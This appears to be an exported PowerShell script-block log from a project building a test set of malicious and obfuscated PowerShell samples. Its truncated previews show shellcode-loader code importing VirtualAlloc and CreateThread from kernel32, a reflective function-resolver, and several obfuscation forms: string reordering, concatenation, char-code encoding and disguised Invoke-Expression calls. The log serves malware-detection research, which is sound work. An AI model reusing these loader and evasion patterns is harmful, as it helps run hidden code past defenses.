"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:31:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1754.ps1","2339","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:17 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1754.ps1","3064","(((""{43}{38}{3}{45}{22}{71}{6}{59}{31}{52}{44}{25}{49}{39}{48}{68}{64}{56}{70}{33}{55}{66}{21}{42}{62}{26}{51}{60}{47}{34}{12}{14}{58}{28}{4}{27}{15}{65}{53}{10}{17}{18}{37}{67}{69}{63}{23}{40}{29}{2}"
"8/6/2026 10:31:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:09 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1754.ps1","2780"," ('ECXleF = j3y[DllImport(OQv'+'kernel32.dllOQv)'+']public static extern IntPtr Vi'+'rtualAllo'+'c(IntPtr lpAddress, uint dwSize, '+'uint flAllocatio'+'nType, uint flProtect);[DllImport(OQvkernel32.dl"
"8/6/2026 10:31:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:01 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1754.ps1","19","{( [chAr][inT]$_) }"
"8/6/2026 10:31:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1754.ps1","7986"," .((GET-VAriABLE '*MDr*').NAME[3,11,2]-JoiN'') ( [sTRiNG]::joiN( '', ( '36f108r101I70v32r61O32f39}91r68}108O108Z73v109%112{111Z114}116b40%34%107b101b114b110I101f108r51r50O46Z100O108f108v34O41%93Z112r1"
"8/6/2026 10:30:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:53 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1754.ps1","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:30:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1741.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:37 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1741.ps1","2850","iNvoKe-ExPResSIoN ((((""{25}{46}{10}{38}{24}{34}{35}{48}{43}{1}{20}{28}{29}{40}{7}{21}{2}{3}{23}{19}{0}{44}{4}{9}{36}{30}{31}{41}{17}{18}{33}{15}{26}{13}{6}{8}{27}{47}{39}{12}{11}{37}{45}{5}{16}{14}{22"
"8/6/2026 10:30:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:29 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:29 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1741.ps1","2648",".( $shEllid[1]+$sHEllId[13]+'x') ( (('Q0Ic = aE9[DllImport(fgLkernel32.dll'+'fgL)]public '+'static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll"
"8/6/2026 10:30:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:21 AM","","2323"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:30:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1741.ps1","18","{([chAr] [iNT]$_)}"
"8/6/2026 10:30:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1741.ps1","8046","& ((Get-VaRIaBle '*MDR*').NAmE[3,11,2]-JoIn'')("" $(sET-Item 'vaRIABLE:Ofs'  '' )""+ [StRinG]( '36e99,32l61m32>39f91j68l108e108f73j109e112e111,114,116f40f34e107,101f114l110d101j108d51>50}46e100j108>108f"
"8/6/2026 10:30:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:13 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1741.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\174.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:57 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\174.ps1","3001","IEx ((((""{11}{37}{7}{40}{64}{35}{30}{27}{2}{65}{10}{50}{58}{41}{44}{46}{8}{56}{59}{32}{31}{38}{15}{19}{51}{6}{18}{66}{0}{71}{13}{48}{62}{54}{12}{52}{24}{3}{61}{26}{42}{47}{9}{34}{72}{29}{60}{33}{57}{7"
"8/6/2026 10:29:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:49 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\174.ps1","2769"," .((Gv '*mdr*').Name[3,11,2]-jOIn'') ((('ZjPc = QFq[DllImport(yUFkernel32.dllyUF)]public static extern IntPtr Virtua'+'lAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll"
"8/6/2026 10:29:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:41 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\174.ps1","23","{( [inT]$_ -as[chaR]) }"
"8/6/2026 10:29:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\174.ps1","7997"," .((gv '*mdR*').nAmE[3,11,2]-jOiN'') (-JOin ( '36q99;32q61s32I39O91;68c108q108~73Z109Z112u111~114s116u40c34~107q101c114Z110O101s108O51q50c46q100I108O108c34I41I93Z112h117I98I108Z105c99Z32h115;116;97u11"
"8/6/2026 10:29:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:33 AM","C:\TA\project-ta\data_spliting\test_set\malicious\174.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1733.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:17 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1733.ps1","3079",". ( ([strInG]$VErbOsEPReFerence)[1,3]+'x'-JOiN'')( ((""{18}{63}{37}{41}{72}{13}{56}{35}{20}{14}{9}{58}{50}{53}{4}{49}{69}{71}{46}{59}{26}{51}{65}{10}{0}{61}{1}{19}{43}{55}{67}{34}{36}{25}{3}{64}{17}{54"
"8/6/2026 10:29:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:09 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1733.ps1","2662","(('gA2c = p7X[DllImport(jCrker'+'n'+'el32.dlljCr)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(jCrkernel32.dlljCr)]public s"
"8/6/2026 10:29:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:01 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1733.ps1","23","{( [InT]$_ -aS[CHAR]) }"
"8/6/2026 10:29:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1733.ps1","8011","( '36}99u32u61u32%39M91d68O108B108:73B109M112:111O114u116}40!34O107v101M114u110:101!108%51:50v46O100O108:108}34u41M93v112B117!98!108u105%99B32v115%116u97B116}105B99%32O101%120}116O101u114:110u32}73:11"
"8/6/2026 10:28:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:53 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1733.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1730.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:37 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1730.ps1","2870"," . ((gV '*MDr*').nAmE[3,11,2]-JoiN'') ((((""{22}{44}{28}{33}{2}{3}{12}{40}{1}{21}{18}{43}{15}{42}{30}{23}{14}{24}{17}{46}{16}{13}{39}{8}{41}{47}{10}{29}{32}{27}{11}{37}{0}{34}{7}{36}{45}{19}{5}{25}{48}"
"8/6/2026 10:28:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:29 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1730.ps1","2714"," ('v0Sc = XaR[DllImport(mISkernel32.dll'+'mIS)]public static extern IntPtr VirtualAlloc(IntPtr lpAddr'+'ess, uint dwSize, uint flA'+'llocationType, uint flProtect);[Dl'+'lImport(mISkernel32.dllmIS)]'+"
"8/6/2026 10:28:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:21 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1730.ps1","24","{( [INt]$_ -AS [char]) }"
"8/6/2026 10:28:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1730.ps1","7972"," &( $pshome[4]+$pSHOMe[30]+'x')(-jOIN ( '36Z99t32j61@32j39L91A68L108y108Z73@109j112j111@114@116y40y34L107U101U114L110L101@108U51t50Z46t100Z108@108>34Z41Z93L112y117N98j108@105Z99U32y115@116>97A116j105U"
"8/6/2026 10:28:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1730.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:08 AM","","9","$global:?"
"8/6/2026 10:28:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:07 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:28:07 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:28:07 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
